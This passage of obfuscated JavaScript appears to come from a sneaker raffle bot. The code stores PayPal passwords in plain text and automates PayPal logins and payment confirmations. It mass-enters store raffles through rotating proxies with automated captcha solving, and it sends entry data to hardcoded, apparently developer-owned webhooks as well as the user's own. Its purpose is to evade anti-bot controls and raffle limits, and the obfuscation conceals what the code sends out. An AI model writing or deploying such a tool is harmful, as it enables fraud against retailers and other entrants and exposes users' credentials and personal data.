        let _0x49d8be = {}, _0x2bd14d = await _0x40afc7['get']('Email');
        _0x49d8be['Email'] = _0x2bd14d['Email'];
        var _0x3928f2 = Math['round'](Math['random']() * (_0x81b4d1['length'] - 0x1));
        _0x49d8be['Proxy'] = _0x81b4d1[_0x3928f2], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x47cbfc = await _0x40afc7['get']('Password');
        return _0x49d8be['Password'] = _0x47cbfc['Password'], _0x3e92a1['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x49d8be['Email'] + ',' + _0x49d8be['Password'] + ',' + _0x49d8be['Proxy']), _0x49d8be;
    }
    let _0x2cf5b5 = await _0x48efa5();
    var _0x1f866f = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x16538e = await _0x40afc7['get']('Amount'), _0x59ea22 = _0x16538e['Amount'];
    async function _0x5a8af4() {
        let _0x16f8fe = 0x0;
        var _0x3bce17 = new _0x2796bc({
            'user': _0x24de00['masterMail'],
            'password': _0x24de00['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x20bc65(_0x367061) {
            _0x3bce17['openBox']('INBOX', ![], _0x367061);
        }
        _0x3bce17['once']('ready', function () {
            _0x20bc65(function (_0x481454, _0x58e64d) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x481454)
                    throw _0x481454;
                _0x3bce17['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3bf5ae, _0x3549da) {
                    if (!_0x3549da || !_0x3549da['length'])
                        console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20No\x20mails\x20found'), _0x3bce17['end']();
                    else {
                        _0x3549da = _0x3549da['slice'](0x0, _0x59ea22);
                        var _0xba0805 = _0x3bce17['seq']['fetch'](_0x3549da, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0xba0805['on']('message', function (_0x12f966, _0x7a7901) {
                            var _0x3e4b28 = '(#' + _0x7a7901 + ')\x20';
                            _0x12f966['on']('body', function (_0x306183, _0x1f4124) {
                                _0x1a979e(_0x306183, (_0x13b002, _0x3679a4) => {
                                    if (_0x3679a4['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x3679a4['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x3679a4['text']['split']('[')[0x2];
                                        var _0xc011ad = mes['split'](']')[0x0];
                                        _0x1f866f['push'](_0xc011ad);
                                    }
                                });
                            }), _0x12f966['once']('end', function () {
                                _0x16f8fe++;
                            });
                        }), _0xba0805['once']('error', function (_0x549af3) {
                            console['log']('Fetch\x20error:\x20' + _0x549af3);
                        }), _0xba0805['once']('end', function () {
                            _0x3bce17['end']();
                        });
                    }
                });
            });
        }), _0x3bce17['once']('error', function (_0x3a5f93) {
            console['log'](_0x467028['red'](_0x3a5f93['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x3bce17['once']('end', async function () {
        }), _0x3bce17['connect']();
    }
    try {
        _0x5a8af4(), await _0x254c61(0xfa0), console['log']('Found\x20' + _0x1f866f['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x254c61(0xfa0);
    }
    var _0x5e2d96;
    _0x1bf238('' + _0xbf2b16);
    var _0xd513ee = _0x2cf5b5['Proxy']['split'](':'), _0x1a8447;
    try {
        _0x1a8447 = await _0x48f2a7['launch']({
            'userDataDir': 'sessions/' + _0x2cf5b5['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xd513ee[0x0] + ':' + _0xd513ee[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x1a8447 = await _0x48f2a7['launch']({
            'userDataDir': 'sessions/' + _0x2cf5b5['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xd513ee[0x0] + ':' + _0xd513ee[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Getting\x20Session');
        const _0x1e6ba3 = await _0x1a8447['newPage']();
        await _0x1e6ba3['authenticate']({
            'username': '' + _0xd513ee[0x2],
            'password': '' + _0xd513ee[0x3]
        }), await _0x1e6ba3['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x1e6ba3['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x1e6ba3['waitForSelector']('#email');
            let _0x238586 = await _0x1e6ba3['$eval']('#email', _0x17b7e6 => _0x17b7e6['getAttribute']('value'));
            if (_0x238586 == '') {
                await _0x1e6ba3['type']('#email', _0x2cf5b5['Email']), await _0x254c61(0x1d3);
                let _0x5a8d5f = await _0x1e6ba3['$']('#splitPassword');
                _0x5a8d5f && (await _0x1e6ba3['click']('#btnNext'), await _0x254c61(0xa28)), await _0x1e6ba3['type']('#password', _0x2cf5b5['Password']), await _0x254c61(0x35c), await _0x1e6ba3['click']('#btnLogin');
            } else
                await _0x1e6ba3['type']('#password', _0x2cf5b5['Password']), await _0x254c61(0x35c), await _0x1e6ba3['click']('#btnLogin');
            await _0x1e6ba3['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Successfully\x20logged\x20in'), await _0x254c61(0x2710);
        } catch (_0x79e22a) {
            throw new Error('Login\x20session\x20expired\x20' + _0x79e22a);
        }
        for (var _0x2bce64 = 0x0; _0x2bce64 < _0x1f866f['length']; _0x2bce64++) {
            console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1bf238(_0xbf2b16 + '\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20/\x20' + _0x1f866f['length']);
            const _0xcb6015 = await _0x1a8447['newPage']();
            await _0xcb6015['goto']('' + _0x1f866f[_0x2bce64], { 'waitUntil': 'networkidle2' }), await _0x254c61(0xbb8);
            try {
                const _0x21c6b8 = await _0xcb6015['$']('#challenge-heading');
                _0x21c6b8 && (console['log'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20:\x20' + _0x467028['yellow']('2FA\x20Required')), await _0xcb6015['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x254c61(0x9c40), await _0xcb6015['waitForSelector']('#payment-submit-btn'), await _0xcb6015['$eval']('#payment-submit-btn', _0x32b5c0 => _0x32b5c0['click']()), await _0xcb6015['click']('#payment-submit-btn');
                try {
                    await _0xcb6015['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x254c61(0x5dc), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x19420c) {
                    _0x96575d = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x19420c['message']);
                } finally {
                    if (_0x96575d == 'yes' && _0x3eaf71 != 0x2) {
                        console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xbf2b16['name'] + ']\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3eaf71 + '\x20/\x205)')), _0x2bce64 = _0x2bce64 - 0x1, _0x3eaf71 = _0x3eaf71 + 0x1;
                        continue;
                    }
                    _0x96575d == 'yes' && _0x3eaf71 >= 0x2 && (_0x9088f0(csv[_0x2bce64], _0xbf2b16), _0x96575d = 'no', _0x3eaf71 = 0x0), await _0xcb6015['close'](), await _0x254c61(0x4650);
                }
            } catch (_0x313a6e) {
                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0xbf2b16 + ']\x20Task\x20' + (_0x2bce64 + 0x1) + '\x20:\x20' + _0x313a6e));
            }
        }
    } catch (_0x11f7ed) {
        console['log'](_0x467028['red']('' + _0x11f7ed));
    } finally {
        await _0x1a8447['close']();
    }
}
const _0x4f8d63 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x276edb, _0x448194, _0x42b3cf) {
                    _0x48f2a7['use'](_0x32ef16()), _0x48f2a7['use'](_0x15a873({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x24de00['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xec5cbe = 0x0; _0xec5cbe < _0x448194['length']; _0xec5cbe++) {
                        if (_0x111c8f != 'yes')
                            var _0x111c8f = '', _0x4e662b = 0x0;
                        var _0x361105;
                        try {
                            await _0x4626f3(_0x448194, _0xec5cbe);
                        } catch {
                            _0x111c8f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1bf238(_0x276edb['name'] + '\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20/\x20' + _0x448194['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                        var _0x176f4b = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x18067c = Math['round'](Math['random']() * (_0x176f4b['length'] - 0x1));
                        _0x448194[_0xec5cbe]['Size'] == 'RANDOM' && (_0x448194[_0xec5cbe]['Size'] = _0x176f4b[_0x18067c]);
                        var _0x3f6a40 = Math['round'](Math['random']() * (_0x42b3cf['length'] - 0x1)), _0x601767 = _0x42b3cf[_0x3f6a40]['split'](':'), _0x4f86ee;
                        try {
                            _0x4f86ee = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x601767[0x0] + ':' + _0x601767[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4f86ee = await _0x48f2a7['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x601767[0x0] + ':' + _0x601767[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x1f743f = await _0x4f86ee['newPage']();
                            await _0x1f743f['authenticate']({
                                'username': '' + _0x601767[0x2],
                                'password': '' + _0x601767[0x3]
                            }), await _0x1f743f['setRequestInterception'](!![]), _0x1f743f['on']('request', _0x488305 => {
                                _0x488305['resourceType']() === 'image' || _0x488305['resourceType']() === 'font' || _0x488305['resourceType']() === 'media' ? _0x488305['abort']() : _0x488305['continue']();
                            }), await _0x1f743f['goto'](_0x448194[_0xec5cbe]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x1f743f['waitForSelector']('#accept-all-gdpr'), await _0x1f743f['click']('#accept-all-gdpr'), await _0x1f743f['waitForSelector']('#raffles-product'), await _0x254c61(0x3e8), await _0x1f743f['$eval']('#raffles-product', _0x42ebed => _0x42ebed['click']()), await _0x254c61(0x1388), await _0x1f743f['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x4685fe = await _0x1f743f['$']('.fancybox-inner\x20>\x20iframe'), _0x5a257e = await _0x4685fe['contentFrame']();
                            console['log'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Checking\x20Information'), await _0x5a257e['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x254c61(0x1f4), await _0x5a257e['type']('input[name=\x22sm-form-email\x22]', _0x448194[_0xec5cbe]['Email']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-name\x22]', _0x448194[_0xec5cbe]['FirstName'] + '\x20' + _0x448194[_0xec5cbe]['LastName']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-street\x22]', _0x448194[_0xec5cbe]['Address1'] + '\x20' + _0x448194[_0xec5cbe]['HouseNumber'] + '\x20' + _0x448194[_0xec5cbe]['Address2']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-city\x22]', _0x448194[_0xec5cbe]['City']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-province\x22]', _0x448194[_0xec5cbe]['State']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-zip\x22]', _0x448194[_0xec5cbe]['Zip']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-country\x22]', _0x448194[_0xec5cbe]['Country']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-form-phone\x22]', _0x448194[_0xec5cbe]['Phone']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x448194[_0xec5cbe]['Follower']), await _0x254c61(0xc8), await _0x5a257e['type']('input[name=\x22sm-cst.size\x22]', _0x448194[_0xec5cbe]['Size']), await _0x254c61(0x1f4), await _0x5a257e['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x254c61(0x1f4), await _0x5a257e['click']('.icheckbox_simple-custom'), await _0x254c61(0x1f4), console['log'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5a257e['$eval']('form', _0x1c8cb3 => _0x1c8cb3['submit']()), console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x111c8f = '';
                            var _0x3944ee = await _0x18ad5f(_0x448194[_0xec5cbe], _0x276edb, 'dev', ![]), _0x4621a1 = await _0x18ad5f(_0x448194[_0xec5cbe], _0x276edb, 'pub', ![]);
                            const _0x2ec3e4 = {
                                'succesDEVMSG': { 'embeds': [_0x3944ee] },
                                'succesPUBMSG': { 'embeds': [_0x4621a1] }
                            };
                            try {
                                _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x2ec3e4['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x2ec3e4['succesDEVMSG']), await _0x254c61(0xc8), await _0x2dfd24(_0x4f6cb7, _0x2ec3e4['succesPUBMSG']);
                            } catch (_0x50ae99) {
                                console['log'](_0x467028['yellow'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x50ae99));
                            }
                        } catch (_0x4e84b9) {
                            console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20' + _0x4e84b9)), _0x361105 = '' + _0x4e84b9;
                            var _0x35c73f = await _0x18ad5f(_0x448194[_0xec5cbe], _0x276edb, 'dev', !![], _0x361105), _0x3944ee = await _0x18ad5f(_0x448194[_0xec5cbe], _0x276edb, 'dev', ![]), _0x4621a1 = await _0x18ad5f(_0x448194[_0xec5cbe], _0x276edb, 'pub', ![]);
                            const _0x204792 = {
                                'succesDEVMSG': { 'embeds': [_0x3944ee] },
                                'succesPUBMSG': { 'embeds': [_0x4621a1] }
                            };
                            _0x204792['errorDEV'] = { 'embeds': [_0x35c73f] }, _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x204792['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x204792['errorDEV']), _0x4e84b9 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x111c8f = 'yes');
                        } finally {
                            _0x4f86ee['close']();
                            if (_0x111c8f == 'yes' && _0x4e662b != 0x5 && _0x361105 != 'Size\x20Not\x20Found') {
                                console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Task\x20' + (_0xec5cbe + 0x1) + '\x20:\x20Retrying\x20(' + _0x4e662b + '\x20/\x205)\x20')), _0xec5cbe = _0xec5cbe - 0x1, _0x4e662b = _0x4e662b + 0x1;
                                continue;
                            }
                            _0x111c8f == 'yes' && _0x4e662b >= 0x5 && (_0x9088f0(_0x448194[_0xec5cbe], _0x276edb), _0x111c8f = 'no', _0x4e662b = 0x0), console['log'](_0x36583e() + '\x20[' + _0x276edb['name'] + ']\x20Waiting\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x186e2f, _0x438c8c) {
                    var _0xd5f57a = [];
                    async function _0x4b24a6() {
                        var _0x94ef7e = new _0x2796bc({
                            'user': _0x24de00['masterMail'],
                            'password': _0x24de00['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5d9d72(_0x455b1c) {
                            _0x94ef7e['openBox']('INBOX', ![], _0x455b1c);
                        }
                        _0x94ef7e['once']('ready', function () {
                            _0x5d9d72(function (_0xb8bcf9, _0x1c82ab) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xb8bcf9)
                                    throw _0xb8bcf9;
                                _0x94ef7e['seq']['search'](['UNSEEN'], function (_0x10591a, _0x22c6a5) {
                                    if (!_0x22c6a5 || !_0x22c6a5['length'])
                                        console['log'](_0x36583e() + '\x20[' + _0x186e2f['name'] + ']\x20No\x20mails\x20found'), _0x94ef7e['end']();
                                    else {
                                        var _0x295bef = _0x94ef7e['seq']['fetch'](_0x22c6a5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x295bef['on']('message', function (_0x1daffc, _0x589b57) {
                                            var _0x1ba2d7 = '(#' + _0x589b57 + ')\x20';
                                            _0x1daffc['on']('body', function (_0x39fe8b, _0x231efb) {
                                                _0x1a979e(_0x39fe8b, (_0x276f90, _0x16254a) => {
                                                    if (_0x16254a['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x5ca06f = _0x16254a['html']['split']('\x0a');
                                                        for (var _0x35d8f9 = 0x0; _0x35d8f9 < _0x5ca06f['length']; _0x35d8f9++) {
                                                            if (_0x5ca06f[_0x35d8f9]['includes']('salesmanago') && _0x5ca06f[_0x35d8f9]['includes']('<td') && _0x5ca06f[_0x35d8f9]['includes']('href')) {
                                                                var _0xd86dd3 = _0x5ca06f[_0x35d8f9]['split']('href=\x22'), _0x4160a4 = _0xd86dd3[0x1]['split']('\x22')[0x0];
                                                                _0xd5f57a['push'](_0x4160a4);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1daffc['once']('end', function () {
                                            });
                                        }), _0x295bef['once']('error', function (_0x3e0c9d) {
                                            console['log']('Fetch\x20error:\x20' + _0x3e0c9d);
                                        }), _0x295bef['once']('end', function () {
                                            _0x94ef7e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x94ef7e['once']('error', function (_0x42ede5) {
                            console['log'](_0x467028['red'](_0x42ede5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x94ef7e['once']('end', async function () {
                        }), _0x94ef7e['connect']();
                    }
                    async function _0x4eb547(_0x10b1aa, _0x47bb4e, _0x4fc427) {
                        for (var _0x5bf1a7 = 0x0; _0x5bf1a7 < _0x47bb4e['length']; _0x5bf1a7++) {
                            async function _0x33d76d(_0x497dba, _0x3d8c7c, _0x5aac73, _0x2a58b2, _0x5e1c5a) {
                                var _0xa925f4, _0x308bc4 = {}, _0x1d550c = [], _0x147a3a = {}, _0x2bad92 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2762a8 = Math['round'](Math['random']() * (_0x2bad92['length'] - 0x1));
                                _0x2a58b2[_0x497dba]['Size'] == 'RANDOM' && (_0x2a58b2[_0x497dba]['Size'] = _0x2bad92[_0x2762a8]);
                                !_0x2a58b2 && (_0x2a58b2 = {});
                                if (_0x24de00['useRandomProxy'] = ![])
                                    var _0x18ddab = _0x5e1c5a[_0x497dba]['split'](':');
                                else
                                    var _0x4e9e30 = Math['round'](Math['random']() * (_0x5e1c5a['length'] - 0x1)), _0x18ddab = _0x5e1c5a[_0x4e9e30]['split'](':');
                                var _0x24df8a = {
                                    'jar': _0x3be8c2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5aac73['url'],
                                    'headers': _0x5aac73['headers'],
                                    'body': JSON['stringify'](_0x308bc4),
                                    'proxy': 'http://' + _0x18ddab[0x2] + ':' + _0x18ddab[0x3] + '@' + _0x18ddab[0x0] + ':' + _0x18ddab[0x1]
                                };
                                return _0x3d8c7c != 'ver' && (_0x24df8a['url'] = _0x5aac73['url'], _0x24df8a['headers'] = _0x5aac73['headers']), _0x3d8c7c == 'ver' && (_0x24df8a['method'] = 'GET', _0x24df8a['url'] = _0x2a58b2[_0x497dba]), new Promise(function (_0x30b966, _0xdaa8ca) {
                                    callback = async (_0x39f801, _0x5d95e3, _0x4fba11) => {
                                        if (!_0x39f801 && _0x5d95e3['statusCode'] == 0xca || !_0x39f801 && _0x5d95e3['statusCode'] == 0xc8) {
                                            if (_0x3d8c7c != 'ver') {
                                                var _0x523d62 = await _0x18ad5f(_0x2a58b2[_0x497dba], _0x5aac73, 'dev', ![]), _0x89f326 = await _0x18ad5f(_0x2a58b2[_0x497dba], _0x5aac73, 'pub', ![]);
                                                const _0x1eca1c = {
                                                    'succesDEVMSG': { 'embeds': [_0x523d62] },
                                                    'succesPUBMSG': { 'embeds': [_0x89f326] }
                                                };
                                                if (_0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '')
                                                    try {
                                                        await _0x2dfd24(_0x24de00['webhook'], _0x1eca1c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x254c61(0xc8), await _0x2dfd24(_0x1227c5, _0x1eca1c['succesDEVMSG']), await _0x254c61(0xc8);
                                                try {
                                                    await _0x2dfd24(_0x4f6cb7, _0x1eca1c['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x547244(_0x2a58b2[_0x497dba], _0x5aac73);
                                            }
                                            _0x30b966(console['log'](_0x467028['green'](_0x36583e() + '\x20[' + _0x5aac73['name'] + ']\x20Task\x20' + (_0x497dba + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3d8c7c != 'ver') {
                                                var _0x32f675 = '' + _0x39f801, _0x3f72dc = await _0x18ad5f(_0x2a58b2[_0x497dba], _0x5aac73, 'dev', !![], _0x32f675), _0x250e2b = {};
                                                _0x250e2b['errorDEV'] = { 'embeds': [_0x3f72dc] }, _0x9088f0(_0x2a58b2[_0x497dba], _0x5aac73), _0x24de00['webhook'] != undefined && _0x24de00['webhook'] != '' && await _0x2dfd24(_0x24de00['webhook'], _0x250e2b['errorDEV']), await _0x2dfd24(_0x3fd40a, _0x250e2b['errorDEV']);
                                            }
                                            _0xdaa8ca(console['log'](_0x467028['red'](_0x36583e() + '\x20[' + _0x5aac73['name'] + ']\x20Task\x20' + (_0x497dba + 0x1) + ':\x20' + _0x39f801)));
                                        }
                                    };
                                    try {
                                        _0x3d8c7c != 'ver' ? console['log'](_0x36583e() + '\x20[' + _0x5aac73['name'] + ']\x20Task\x20' + (_0x497dba + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x308bc4['data']['attributes']['email']) : console['log'](_0x36583e() + '\x20[' + _0x5aac73['name'] + ']\x20Task\x20' + (_0x497dba + 0x1) + ':\x20Fetching\x20Response'), _0x35812d(_0x24df8a, callback);
                                    } catch (_0x36f259) {
                                        console['log'](_0x36583e() + '\x20Task\x20' + (_0x497dba + 0x1) + ':\x20' + _0x36f259);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x33d76d(_0x5bf1a7, 'ver', _0x10b1aa, _0x47bb4e, _0x4fc427), console['log'](_0x36583e() + '\x20[' + _0x10b1aa['name'] + ']\x20Sleeping\x20for\x20' + _0x24de00['delay'] + '\x20ms'), await _0x254c61(_0x24de00['delay']);
                            } catch (_0x5f1e0b) {
                            }
                        }
                    }
                    try {
                        _0x4b24a6(), await _0x254c61(0xfa0), console['log']('Found\x20' + _0xd5f57a['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4eb547(_0x186e2f, _0xd5f57a, _0x438c8c);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x25186f, _0x1d503d, _0x225286) {
                for (var _0x42b88f = 0x0; _0x42b88f < _0x1d503d['length']; _0x42b88f++) {
                    _0x24de00['AfewDelay'] = _0x24de00['delay'];
                    var _0x47635d;
                    if (_0x1ff2a9 != 'yes')
                        var _0x1ff2a9 = '', _0x21508e = 0x0;
                    var _0x47dc94 = _0x1d503d[_0x42b88f]['Url'], _0x730aed = _0x1d503d[_0x42b88f];
                    _0x1bf238(_0x25186f['name'] + '\x20Task\x20' + (_0x42b88f + 0x1) + '\x20/\x20' + _0x1d503d['length'] + '\x20||\x20File:\x20' + _0x339545 + '\x20Proxies:\x20' + _0x293577);
                    try {
                        await _0x4626f3(_0x1d503d, _0x42b88f);
                    } catch {
                        _0x1ff2a9 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4a5593(_0x29614b) {
                        const _0x2ecfad = _0x3e92a1['readFileSync']('../successful-tasks.csv', 'utf8'), _0x1805f7 = _0x1c3b5f['parse'](_0x2ecfad, { 'header': !![] })['data'];
                        let _0x2ec587 = ![];
                        for (var _0x2d752e of _0x1805f7) {
                            if (_0x2d752e['Url'] == _0x29614b['Url'] && _0x2d752e['Email'] == _0x29614b['Email']) {
                                _0x2ec587 = !![];
                                break;
                            }
                        }
                        return _0x2ec587;
                    }
                    if (await _0x4a5593(_0x1d503d[_0x42b88f]) == !![]) {
                        console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x548c2e = await _0x18ad5f(_0x1d503d[_0x42b88f], _0x25186f, 'dev', ![]), _0x56d295 = await _0x18ad5f(_0x1d503d[_0x42b88f], _0x25186f, 'pub', ![]);
                    const _0x1d4816 = {
                        'succesDEVMSG': { 'embeds': [_0x548c2e] },
                        'succesPUBMSG': { 'embeds': [_0x56d295] }
                    };
                    if (_0x1d503d[_0x42b88f]['Email'] == '' || _0x1d503d[_0x42b88f]['FirstName'] == '' || _0x1d503d[_0x42b88f]['LastName'] == '' || _0x1d503d[_0x42b88f]['Country'] == '' || _0x1d503d[_0x42b88f]['Size'] == '' || _0x1d503d[_0x42b88f]['Address1'] == '' || _0x1d503d[_0x42b88f]['Zip'] == '') {
                        console['log'](_0x36583e() + '\x20[' + _0x25186f['name'] + ']\x20Task\x20' + (_0x42b88f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x24de00['useRandomProxy'] = ![])
                        var _0xa94668 = _0x225286[_0x42b88f]['split'](':');
                    else
                        var _0x244c2a = Math['round'](Math['random']() * (_0x225286['length'] - 0x1)), _0xa94668 = _0x225286[_0x244c2a]['split'](':');
                    var _0x16f204;
                    try {
                        _0x16f204 = await _0x48f2a7['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xa94668[0x0] + ':' + _0xa94668[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
